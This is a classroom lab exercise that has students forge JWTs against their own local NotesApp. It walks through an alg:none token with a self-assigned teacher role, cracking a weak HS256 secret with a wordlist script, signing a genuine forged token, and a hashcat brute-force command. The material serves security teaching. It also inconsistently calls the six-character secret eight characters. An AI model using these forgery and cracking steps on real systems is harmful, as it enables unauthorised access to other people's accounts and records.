# Exercise — Forge a token: become a teacher

**Your job:** make NotesApp believe you are a teacher, and read a grade that is not yours —
**without a password and without any key.** Two ways in: Part 1 skips the signature; Part 2 cracks
the secret behind it. You only *break* it today. You fix it next class. About 25 minutes, with
your pair.

Work inside your `notesapp/` clone. Every command assumes you are in that folder.

!!! abstract "What you hand in — three lines, not a transcript"
    The deliverable is the **three-line finding** at the bottom: what you read, how, and why it
    worked. The commands are scaffolding — run them, or have AI drive them. What is yours is the
    grade you read and the sentence explaining why the server believed you.

!!! warning "Only your own app"
    You attack **only** your own NotesApp clone, on your own machine. That is the whole target.
    The technique is real; that is exactly why it only ever touches your own app here.

!!! question "Predict first — commit with your pair"
    You are about to send NotesApp a token with **no signature at all** — the part that is
    supposed to prove the server made it. **Will the server accept it?** Write down yes or no,
    and why, before you run anything.

---

## Start the app

```bash
docker compose up -d        # start db + web in the background
```

Open <http://localhost:8080> and log in as **`alice`** / **`alicepw`** (a student). Leave the
tab open — you are alice, a student, for the whole exercise.

---

## Step 1 — Look at the ticket you were given

When alice logged in, NotesApp handed her a JWT. Let's read it.

On the dashboard page, open the browser **DevTools console** (F12 → Console) and type:

```js
TOKEN
```

??? note "Can't see it? Read it from the page another way"
    The token is also printed into the page source. View source and search for `TOKEN`, or just
    skip ahead — you do **not** need alice's real token to forge one. You will build a token from
    scratch in Step 3.

Copy the string. It has three parts split by two dots: `header.payload.signature`. Paste it into
a decoder you run yourself — no website needed:

```bash
python3 - <<'PY'
import base64, json
tok = "PASTE_THE_TOKEN_HERE"
head, payload, sig = tok.split(".")
def d(s): return json.loads(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)))
print("HEADER :", d(head))
print("PAYLOAD:", d(payload))
print("SIG    :", sig[:12], "...")
PY
```

!!! success "📏 Record — what is in the payload?"
    - What does the **payload** say your `role` is? ________
    - Was the payload **encrypted**, or could you read it straight away? ________

    You just read the inside of the token with no key. The payload is only **base64** — an
    encoding, not a lock. A JWT hides nothing; the signature only proves nobody *changed* it.

---

## Step 2 — The idea of the attack

The server reads the **header** to decide how to check the signature. The header is part of the
token. **You** write the token. So you get to write the instruction that tells the server how —
or whether — to check.

What if you set the header's algorithm to `"none"`? A broken server reads `"none"` and skips the
signature check completely. Then it trusts every word of your payload — including a `role` you
chose yourself.

That is the whole attack. Let's do it.

---

## Step 3 — Forge a teacher token

Build a token by hand: header says `alg: none`, payload says `role: teacher`, and the signature
is **left empty** (nothing after the last dot).

```bash
FORGED=$(python3 -c "import json,base64
b=lambda x: base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'}) + '.' + b({'user_id':9999,'username':'attacker','role':'teacher'}) + '.')")
echo "$FORGED"
```

That `echo` shows your forged token. Notice it **ends with a dot** — the signature slot is empty.
Nobody signed this. You made it in one line.

---

## Step 4 — Read a grade that is not yours

Note **id 3** belongs to **bob**, not to alice. As alice in the browser you cannot see it. Send
your forged token to the API and ask for it anyway:

```bash
curl -H "Authorization: Bearer $FORGED" http://localhost:8080/api/notes/3
```

!!! success "📏 Record — what came back?"
    - Did you get bob's note, or an error? ________
    - What is **bob's grade**? ________  (expected: `12.6`)
    - What is **bob's comment**? ________

??? question "Done? Open this to debrief — not before"
    **Was your prediction right? Why did a token with no signature work?**

    ??? success "The answer"
        The server accepted it. Here is the chain:

        1. The server read the **header** to decide how to verify — and the header is part of the
           token *you* wrote.
        2. You wrote `"alg": "none"`, so the server skipped signature verification entirely.
        3. With no check, it believed the **payload** word for word — including `role: teacher`.

        No password. No key. No stolen cookie. You wrote the word *teacher* and told the server
        not to look. That is **flaw #4** in NotesApp — a forgeable token.

        (There is a second bug hiding here: even a *real* teacher token can read *any* student's
        note, because the API never checks who owns it. That is a different flaw — broken access
        control — for a later class. Today's bug is only that a **forged identity is trusted at
        all**.)

!!! tip "Try one more, if you have time"
    Change `/api/notes/3` to `/api/notes/4`, `/5`, `/6`… Each is a different student's grade.
    One forged token, the whole class's grades.

---

## Part 2 — "But I'll just reject `none`!" — not enough

Suppose the server is fixed to **reject `alg:none`**. Your blank-signature trick now fails. Are
you safe?

!!! question "Predict first — commit with your pair"
    The server now demands a **real HS256 signature**. To sign, you need its secret key — and you
    don't have it. **Can you still forge a teacher token?** Yes or no, and why?

The signature is only as strong as the **secret** behind it. NotesApp signs with the word
`s3cr3t` — eight characters. A short secret can be **guessed** from a list of common ones. If you
guess it, you can sign a token that looks completely genuine.

### Step 5 — Crack the secret

You already have alice's **real** token from Step 1 (three parts, properly signed). Its signature
was made from `header.payload` + the secret. Try each word in a list until one produces the same
signature — that word **is** the secret.

Download the wordlist: [`jwt-secrets.txt`](assets/jwt-secrets.txt) (save it next to your clone),
then:

```bash
python3 - <<'PY'
import hmac, hashlib, base64
tok = "PASTE_ALICE_REAL_TOKEN_FROM_STEP_1"
head_payload = ".".join(tok.split(".")[:2])
target_sig   = tok.split(".")[2]
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

for word in open("jwt-secrets.txt").read().split():
    sig = b64(hmac.new(word.encode(), head_payload.encode(), hashlib.sha256).digest())
    if sig == target_sig:
        print("CRACKED — the secret is:", repr(word))
        break
else:
    print("not in the list")
PY
```

!!! success "📏 Record"
    - What is NotesApp's signing secret? ________  (expected: `s3cr3t`)
    - It is a **real dictionary word in leetspeak**. How long would a random 32-character key take
      to guess this way? (Think about it — this is why fix #3 is "long *and* random".)

### Step 6 — Sign a *genuine* teacher token

Now you hold the secret. Sign a brand-new teacher token — a real HS256 signature, not a blank
one. This passes even a server that rejects `alg:none`.

```bash
SIGNED=$(python3 -c "import json,hmac,hashlib,base64
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode()
secret='s3cr3t'
h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
p=b(json.dumps({'user_id':9999,'username':'attacker','role':'teacher'}).encode())
s=b(hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{s}')")
curl -H "Authorization: Bearer $SIGNED" http://localhost:8080/api/notes/3
```

!!! success "📏 Record — what came back?"
    - Did the **signed** forged token work? ________
    - This token has a valid signature. Would "reject `alg:none`" have stopped it? ________ (no)

??? tip "Finished early? Brute force it — and watch *length* win, not the wordlist"
    The wordlist cracked `s3cr3t` in under a second — but only because it is a **word**. What if the
    secret were random, with no word to look up? Then you must try **every combination**. That is
    brute force, and its only enemy is **length**.

    !!! info "You really *could* brute-force `s3cr3t` — it just takes ~2 hours"
        `s3cr3t` is 6 characters, so pure brute force on your laptop finds it in about **2 hours**
        (see the table below). To a real attacker, two hours is **nothing** — they start it and go
        to lunch. It's only too long for *our class*. So in class we use the wordlist, which wins in
        a second because the secret is a word. Both attacks work; the wordlist is just the fast one
        for a one-hour slot.

    You don't need to sit through the two hours (you already have the secret). Instead, measure how
    fast *your* laptop guesses, and let it print the time wall:

    ```bash
    python3 - <<'PY'
    import hmac, hashlib, base64, itertools, string, time
    tok = "PASTE_ALICE_REAL_TOKEN_FROM_STEP_1"
    head_payload = ".".join(tok.split(".")[:2])
    def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    charset = string.ascii_lowercase + string.digits     # 36 characters: a-z 0-9
    # Time a quick sample of real guesses to learn this laptop's rate.
    N, t0 = 100_000, time.time()
    for i, combo in enumerate(itertools.product(charset, repeat=6)):
        if i >= N: break
        b64(hmac.new("".join(combo).encode(), head_payload.encode(), hashlib.sha256).digest())
    rate = N / (time.time() - t0)
    print(f"this laptop guesses ~{rate:,.0f} secrets/second in Python\n")

    for length in range(4, 13):
        combos = len(charset) ** length
        secs = combos / rate
        if   secs < 120:      t = f"{secs:.0f} seconds"
        elif secs < 7200:     t = f"{secs/60:.0f} minutes"
        elif secs < 172800:   t = f"{secs/3600:.1f} hours"
        elif secs < 3.15e7:   t = f"{secs/86400:.0f} days"
        else:                 t = f"{secs/3.15e7:,.0f} years"
        mark = "  <- s3cr3t is here" if length == 6 else ""
        print(f"  {length:2d} random chars: {combos:>22,} combos  ->  {t}{mark}")
    PY
    ```

    Read the output. `s3cr3t`'s length (6) is about **2 hours** in Python — doable for an attacker,
    just not for us. Each extra character multiplies the time by 36. By 12 characters it is
    **millions of years** — and a real key is 32. The wordlist won only because `s3cr3t` was a
    dictionary word; against a long *random* secret, neither the wordlist nor brute force ever
    finishes. **That is fix #3: long AND random.**

    ??? note "How a real attacker does it (no install needed to read this)"
        Pure Python is slow. A real attacker points **hashcat** at a GPU, which tries *billions* per
        second — it would crack a 6-char secret like `s3cr3t` in seconds:

        ```bash
        # 16500 = JWT mode; -a 3 = brute force; ?a = any printable char, one per position
        hashcat -m 16500 token.txt -a 3 ?a?a?a?a?a?a
        ```

        Same wall, just a faster wall-breaker. Length is still the only thing that saves you: add
        characters and even a GPU runs out of time.

??? question "Done? The lesson both halves add up to"
    ??? success "The answer"
        `alg:none` and a weak secret are **two different holes**, and closing one leaves the
        other open:

        - Reject `none` → stops the blank-signature forgery (Part 1).
        - …but a guessable secret still lets an attacker make a **genuinely signed** token
          (Part 2).

        That is why the real fix is **all three** at once: reject `none`, pin the algorithm, **and**
        use a long random secret. Miss any one, and a forged teacher walks in.

---

## What you hand in

Four lines. This is the finding:

```
FORGED-TOKEN FINDING — NotesApp flaw #4 (auth)
  What I read:   bob's grade (____) and comment, via /api/notes/3
  Break 1:       a JWT with "alg":"none" and no signature; role set to "teacher"
  Break 2:       cracked the HS256 secret (____) from a wordlist; signed a real teacher token
  Why it worked: the server let the TOKEN choose how to verify, AND its secret was guessable
```

---

## You do NOT fix it today

Next class (the lab) you close this for real, three ways:

1. **Reject `"none"`** — a token with no signature is never valid.
2. **Pin the algorithm** — the *server* decides it only accepts `HS256`; the token does not get
   a vote.
3. **Use a long random secret** — NotesApp's secret is `s3cr3t`, eight characters, guessable in
   seconds.

Bring today's forged token with you — you will watch each fix reject it.

---

## Cleanup

```bash
docker compose down     # your data lives in a volume and is kept
```

## Troubleshooting

??? bug "`curl` returns `{"error":"unauthorized"}`"
    The token did not parse. Re-run Step 3 exactly — the most common cause is a missing trailing
    dot (the empty signature) or a line break pasted into `$FORGED`. Run `echo "$FORGED"` and
    check it is one line ending in `.`

??? bug "`curl` returns `{"error":"not found"}`"
    That note id has no row. Try `/api/notes/1` through `/api/notes/10`. The token worked — the
    server accepted your forged identity; it just could not find that particular note.

??? bug "`python3: command not found`"
    Try `python`. On Windows without Python, run the two commands inside the web container:
    `docker compose exec web sh`, then use `python3` there (`curl` to `localhost:8080` still works
    from your host browser/terminal).
